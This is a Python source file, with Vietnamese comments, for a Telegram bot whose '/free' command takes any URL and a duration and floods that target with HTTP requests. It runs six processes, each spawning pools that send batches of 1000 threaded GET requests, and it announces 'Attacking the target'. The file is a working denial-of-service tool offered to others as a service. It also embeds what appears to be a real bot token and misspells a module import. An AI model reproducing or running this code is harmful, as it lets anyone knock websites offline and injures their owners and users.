import telebot
import requests
import time
import psutik
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore

# Khởi tạo colorama
init(autoreset=True)

# Token của bot Telegram
TOKEN = "7667637653:AAFzvUQvPUANTxss3_jwa2SMSfvWZVq6x9s"
bot = telebot.TeleBot(TOKEN)

# Hàm gửi một yêu cầu HTTP, với xử lý ngoại lệ để tránh lỗi treo
def send_request(url):
    try:
        response = requests.get(url, timeout=5)  # Tăng thời gian timeout để đảm bảo ổn định hơn
        print(Fore.GREEN + f"Trạng thái {response.status_code}")
    except requests.RequestException as e:
        print(Fore.RED + f"Lỗi - {str(e)}")

# Hàm gửi yêu cầu HTTP theo nhóm, với quản lý lỗi
def send_batch_requests(url, batch_size):
    with ThreadPoolExecutor(max_workers=batch_size) as executor:
        for _ in range(batch_size):
            executor.submit(send_request, url)
        time.sleep(0.5)  # Nghỉ 0.5 giây giữa các lần gửi để tránh quá tải

# Hàm chính gửi yêu cầu HTTP liên tục trong thời gian quy định, với 6 tiến trình song song
def send_requests_with_time_limit(url, duration):
    start_time = time.time()
    batch_size = 1000

    # Hàm chạy song song trong mỗi tiến trình (mỗi "tab")
    def run_tab():
        with multiprocessing.Pool(processes=5) as pool:  # Giới hạn tiến trình là 5 để tránh quá tải trong mỗi tab
            while time.time() - start_time < duration:
                pool.apply_async(send_batch_requests, (url, batch_size))
                time.sleep(1)  # Nghỉ 1 giây giữa các lần chạy để tránh quá tải

    # Tạo 6 tiến trình song song (6 "tab" chạy cùng lúc)
    processes = []
    for _ in range(6):
        process = multiprocessing.Process(target=run_tab)
        process.start()
        processes.append(process)

    # Đợi cả 6 tiến trình hoàn thành
    for process in processes:
        process.join()

    print(Fore.YELLOW + f"Hoàn thành gửi yêu cầu tới {url} trong {duration} giây với 6 tab.")

# Lệnh /start để chào mừng người dùng
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Chào mừng!\n━━━━━━━━━━━━━━━━━━━\n𝗠𝗲𝗻𝘂 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ☔️\n#1: /free Ddos free")

# Lệnh /free để gửi yêu cầu HTTP theo URL và thời gian người dùng yêu cầu
@bot.message_handler(commands=['free'])
def free(message):
    try:
        # Tách tin nhắn thành các phần tử
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "Vui lòng cung cấp URL và thời gian. Ví dụ: /free http://example.com 60")
            return
        
        url = args[1]
        duration = int(args[2])
        
        bot.reply_to(message, f"⚔️Attacking the target⚔️\n━━━━━━━━━━━━━━━━━━\n↣Link: {url}\n↣Time: {duration}s")
        
        # Gửi yêu cầu HTTP với 6 "tab" chạy song song
        send_requests_with_time_limit(url, duration)
        
        bot.reply_to(message, f"Hoàn thành Tấn công\n━━━━━━━━━━━━━━━━━━━\n↣Link: {url}\n↣Time: {duration}s.")
    except ValueError:
        bot.reply_to(message, "Thời gian phải là một số nguyên dương. Vui lòng thử lại.")


@bot.message_handler(commands=['cpu'])
def check_cpu(message):
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    # Tiếp tục xử lý lệnh cpu ở đây
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')


# Khởi động bot
bot.infinity_polling(timeout=60, long_polling_timeout = 1)